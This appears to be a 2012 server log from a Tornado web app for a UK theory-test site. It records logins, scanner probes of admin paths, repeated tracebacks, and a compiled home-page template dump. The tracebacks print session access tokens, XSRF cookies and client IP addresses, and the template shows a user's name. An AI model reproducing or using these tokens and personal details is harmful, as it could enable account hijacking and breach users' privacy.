INFO:intheory-8000:Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
WARNING:root:404 HEAD /manager/status (127.0.0.1) 0.77ms
WARNING:root:404 HEAD /manager/status (127.0.0.1) 1.21ms
WARNING:root:405 HEAD / (127.0.0.1) 0.68ms
WARNING:root:405 HEAD / (127.0.0.1) 0.72ms
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
INFO:intheory-8002:Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
WARNING:root:404 HEAD /manager/status (127.0.0.1) 11.80ms
WARNING:root:404 GET /search/cc.php (127.0.0.1) 11.87ms
WARNING:root:404 GET /parking.php?domain=intheory.co.uk&keyword=webarchiv (127.0.0.1) 13.68ms
Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
INFO:intheory-8002:Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
WARNING:root:404 GET /user/soapCaller.bs (127.0.0.1) 0.76ms
WARNING:root:404 GET /user/soapCaller.bs (127.0.0.1) 1.06ms
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
INFO:intheory-8001:Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
INFO:intheory-8003:Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
INFO:intheory-8001:Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
WARNING:root:405 HEAD / (127.0.0.1) 0.69ms
WARNING:root:404 GET /h (127.0.0.1) 0.75ms
Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
INFO:intheory-8000:Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
WARNING:root:405 HEAD / (127.0.0.1) 0.67ms
WARNING:root:404 GET //jmx-console/HtmlAdaptor (127.0.0.1) 0.77ms
WARNING:root:404 GET /hq/ (127.0.0.1) 1.30ms
WARNING:root:404 GET /search/fb.php?ses= (127.0.0.1) 0.84ms
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
Facebook user with id 506e9e178e4c852a6c747184 has successfully logged in.
INFO:intheory-8003:Facebook user with id 506e9e178e4c852a6c747184 has successfully logged in.
Facebook user with id 506e9e178e4c852a6c747184 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506e9e178e4c852a6c747184 has successfully logged in.
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.57 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFNZFlKbDk0MDJKd1B1UHNVaGk3dGdGdGczNG1qMzVDMnN5STJPMWxEaUQ4UW04WkJIWkFkNGlpTmV2UnVVVDQxclM1WFpBVHZFOXFFY1hJdzY3V0ZlU2txQ3hmUVpEWkQ=|1348053554|ac07d46d67d8ee02d32f8ff95325dfe712d40b21"; __utma=188782963.1555786485.1347973685.1348053519.1348059227.3; __utmz=188782963.1347973685.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '83.244.221.226'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 209, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 54.91ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.57 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFNZFlKbDk0MDJKd1B1UHNVaGk3dGdGdGczNG1qMzVDMnN5STJPMWxEaUQ4UW04WkJIWkFkNGlpTmV2UnVVVDQxclM1WFpBVHZFOXFFY1hJdzY3V0ZlU2txQ3hmUVpEWkQ=|1348053554|ac07d46d67d8ee02d32f8ff95325dfe712d40b21"; __utma=188782963.1555786485.1347973685.1348053519.1348059227.3; __utmz=188782963.1347973685.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '83.244.221.226'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 209, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.65ms
Facebook user with id 504e0ce18e4c854a5c9fc2f2 has successfully logged in.
INFO:intheory-8003:Facebook user with id 504e0ce18e4c854a5c9fc2f2 has successfully logged in.
Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
INFO:intheory-8000:Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
WARNING:root:404 GET /favicon.ico (109.155.226.124) 0.97ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.10 Safari/537.11', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=bfa32809b9434dc5b19e6536f9c32ee6; access_token="QUFBRzZsTmNzNkdjQkFDcFpCb3FVTmlrWTZaQklYVHU4SU5wcVhOR0Y4Nk1BemhtYWk0VjJFOGh5d0xudlFaQk1KcnpYQW5aQWQxcVpCWG1BOFdvNjVZSG1PZlF2Q1V5TmtYZEloVHlaQ3pMQVpEWkQ=|1347918462|dc71e1f475e3463b6fe329feb3f914be82a4d8d1"; __utma=188782963.93926689.1347918435.1347918435.1347967812.2; __utmc=188782963; __utmz=188782963.1347918435.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '109.155.226.124'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 209, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 2.34ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.10 Safari/537.11', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=bfa32809b9434dc5b19e6536f9c32ee6; access_token="QUFBRzZsTmNzNkdjQkFDcFpCb3FVTmlrWTZaQklYVHU4SU5wcVhOR0Y4Nk1BemhtYWk0VjJFOGh5d0xudlFaQk1KcnpYQW5aQWQxcVpCWG1BOFdvNjVZSG1PZlF2Q1V5TmtYZEloVHlaQ3pMQVpEWkQ=|1347918462|dc71e1f475e3463b6fe329feb3f914be82a4d8d1"; __utma=188782963.93926689.1347918435.1347918435.1347967812.2; __utmc=188782963; __utmz=188782963.1347918435.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '109.155.226.124'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 209, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.96ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
 23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
 27      _append(_tmp)  # base.html:65 (via base.html:56)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
 29      if not current_user:  # base.html:67 (via base.html:56)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
 31      else:  # base.html:69 (via base.html:56)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
 33          if current_user['moderator']:  # base.html:71 (via base.html:56)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<img src="')  # base.html:79 (via base.html:56)
 36          _tmp = static_url('imgs/fb.png')  # base.html:79 (via base.html:56)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:79 (via base.html:56)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:79 (via base.html:56)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:79 (via base.html:56)
 40          _append(_tmp)  # base.html:79 (via base.html:56)
 41          _append('" alt="My Image Description" class="align-left frame" /><div class="fb"><div class="fbname"><b>David Mason</b></div><div class="fbpoints"><b><font color="#0589de">217 Points</font></b></div></div>\n')  # base.html:80 (via base.html:56)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:85 (via base.html:56)
 43      _append('\n')  # base.html:87
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:87)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:87)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 49      _append(_tmp)  # home.html:21 (via base.html:87)
 50      _append('","options": ["')  # home.html:21 (via base.html:87)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:87)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 55      _append(_tmp)  # home.html:21 (via base.html:87)
 56      _append('", "')  # home.html:21 (via base.html:87)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:87)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 61      _append(_tmp)  # home.html:21 (via base.html:87)
 62      _append('", "')  # home.html:21 (via base.html:87)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:87)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 67      _append(_tmp)  # home.html:21 (via base.html:87)
 68      _append('", "')  # home.html:21 (via base.html:87)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:87)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 73      _append(_tmp)  # home.html:21 (via base.html:87)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:87)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:87)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 79      _append(_tmp)  # home.html:21 (via base.html:87)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:87)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:87)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 85      _append(_tmp)  # home.html:21 (via base.html:87)
 86      _append('","options": ["')  # home.html:21 (via base.html:87)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:87)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 91      _append(_tmp)  # home.html:21 (via base.html:87)
 92      _append('", "')  # home.html:21 (via base.html:87)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:87)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
 97      _append(_tmp)  # home.html:21 (via base.html:87)
 98      _append('", "')  # home.html:21 (via base.html:87)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:87)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
103      _append(_tmp)  # home.html:21 (via base.html:87)
104      _append('", "')  # home.html:21 (via base.html:87)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:87)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
109      _append(_tmp)  # home.html:21 (via base.html:87)
110      _append('"],"answer": ')  # home.html:21 (via base.html:87)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:87)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
115      _append(_tmp)  # home.html:21 (via base.html:87)
116      _append('}, { "question":"')  # home.html:21 (via base.html:87)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:87)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
121      _append(_tmp)  # home.html:21 (via base.html:87)
122      _append('","options": ["')  # home.html:21 (via base.html:87)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:87)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
127      _append(_tmp)  # home.html:21 (via base.html:87)
128      _append('", "')  # home.html:21 (via base.html:87)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:87)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
133      _append(_tmp)  # home.html:21 (via base.html:87)
134      _append('", "')  # home.html:21 (via base.html:87)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:87)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
139      _append(_tmp)  # home.html:21 (via base.html:87)
140      _append('", "')  # home.html:21 (via base.html:87)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:87)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
145      _append(_tmp)  # home.html:21 (via base.html:87)
146      _append('"],"answer": ')  # home.html:21 (via base.html:87)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:87)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
151      _append(_tmp)  # home.html:21 (via base.html:87)
152      _append('},{ "question":"')  # home.html:21 (via base.html:87)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:87)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
157      _append(_tmp)  # home.html:21 (via base.html:87)
158      _append('","options": ["')  # home.html:21 (via base.html:87)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:87)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
163      _append(_tmp)  # home.html:21 (via base.html:87)
164      _append('", "')  # home.html:21 (via base.html:87)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:87)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
169      _append(_tmp)  # home.html:21 (via base.html:87)
170      _append('", "')  # home.html:21 (via base.html:87)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:87)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
175      _append(_tmp)  # home.html:21 (via base.html:87)
176      _append('", "')  # home.html:21 (via base.html:87)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:87)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
181      _append(_tmp)  # home.html:21 (via base.html:87)
182      _append('"],"answer": ')  # home.html:21 (via base.html:87)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:87)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
187      _append(_tmp)  # home.html:21 (via base.html:87)
188      _append('}, { "question":"')  # home.html:21 (via base.html:87)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:87)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
193      _append(_tmp)  # home.html:21 (via base.html:87)
194      _append('","options": ["')  # home.html:21 (via base.html:87)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:87)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
199      _append(_tmp)  # home.html:21 (via base.html:87)
200      _append('", "')  # home.html:21 (via base.html:87)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:87)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
205      _append(_tmp)  # home.html:21 (via base.html:87)
206      _append('", "')  # home.html:21 (via base.html:87)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:87)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
211      _append(_tmp)  # home.html:21 (via base.html:87)
212      _append('", "')  # home.html:21 (via base.html:87)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:87)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
217      _append(_tmp)  # home.html:21 (via base.html:87)
218      _append('"],"answer": ')  # home.html:21 (via base.html:87)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:87)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
223      _append(_tmp)  # home.html:21 (via base.html:87)
224      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:87)
225      question = kwargs['questions'][0]  # home.html:25 (via base.html:87)
